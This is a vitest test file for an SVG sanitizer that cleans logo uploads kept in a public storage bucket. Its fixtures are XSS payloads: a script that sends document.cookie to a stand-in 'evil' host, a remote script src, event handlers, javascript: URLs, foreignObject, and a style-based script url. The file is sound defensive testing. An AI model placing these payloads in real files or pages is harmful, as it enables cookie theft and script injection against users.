import { describe, expect, it } from 'vitest';
import { sanitizeSvg } from '../../../supabase/functions/_shared/svg-sanitize.ts';

/**
 * branding-profiles allow-lists image/svg+xml into a bucket it creates with
 * `public: true`, and stores the object with the caller's own content type. An
 * SVG is an XML document, so a logo carrying <script> came back as a working
 * public URL that executes in the storage origin - and that URL is rendered in
 * proposals and PDFs sent to customers.
 *
 * It never surfaced in the app because a browser does not run scripts in an SVG
 * loaded through <img>. Direct navigation is another matter.
 */
const wrap = (inner: string) => `<svg xmlns="http://www.w3.org/2000/svg">${inner}</svg>`;

describe('sanitizeSvg', () => {
  it('rejects anything that is not an SVG document', () => {
    const r = sanitizeSvg('<html><body>hi</body></html>');
    expect(r.ok).toBe(false);
  });

  it('keeps an ordinary logo untouched', () => {
    const clean = wrap('<circle cx="10" cy="10" r="5" fill="#123456"/>');
    const r = sanitizeSvg(clean);
    expect(r.ok).toBe(true);
    expect(r.svg).toContain('<circle');
    expect(r.removed).toEqual([]);
  });

  it('strips a script element', () => {
    const r = sanitizeSvg(wrap('<script>fetch("//evil/"+document.cookie)</script><rect/>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/<script/i);
    expect(r.svg).toContain('<rect');
  });

  it('strips a self-closing script with a remote src', () => {
    const r = sanitizeSvg(wrap('<script href="//evil/x.js"/>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/script/i);
  });

  it('strips inline event handlers in every quoting style', () => {
    const r = sanitizeSvg(
      wrap('<rect onload="alert(1)" onclick=\'alert(2)\' onmouseover=alert(3) />'),
    );
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/\son[a-z]+\s*=/i);
    expect(r.svg).toContain('<rect');
  });

  it('strips javascript: in href and xlink:href', () => {
    const r = sanitizeSvg(wrap('<a href="javascript:alert(1)"><text>x</text></a>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/javascript:/i);
    const x = sanitizeSvg(wrap('<image xlink:href="javascript:alert(1)"/>'));
    expect(x.ok).toBe(true);
    expect(x.svg).not.toMatch(/javascript:/i);
  });

  it('strips foreignObject, which can host arbitrary HTML', () => {
    const r = sanitizeSvg(wrap('<foreignObject><body onload="alert(1)"/></foreignObject>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/foreignObject/i);
  });

  it('handles a script nested inside another stripped element', () => {
    const r = sanitizeSvg(wrap('<foreignObject><script>alert(1)</script></foreignObject>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/script/i);
  });

  it('is case-insensitive, so <ScRiPt> does not slip through', () => {
    const r = sanitizeSvg(wrap('<ScRiPt>alert(1)</ScRiPt>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/script/i);
  });

  it('drops a style block carrying a script url', () => {
    const r = sanitizeSvg(wrap('<style>rect{background:url(javascript:alert(1))}</style><rect/>'));
    expect(r.ok).toBe(true);
    expect(r.svg).not.toMatch(/javascript:/i);
  });

  it('keeps an ordinary style block', () => {
    const r = sanitizeSvg(wrap('<style>rect{fill:#abc}</style><rect/>'));
    expect(r.ok).toBe(true);
    expect(r.svg).toContain('fill:#abc');
  });

  it('reports what it removed, for the audit trail', () => {
    const r = sanitizeSvg(wrap('<script>x</script><rect onload="y"/>'));
    expect(r.removed).toContain('script');
    expect(r.removed).toContain('onload');
  });
});
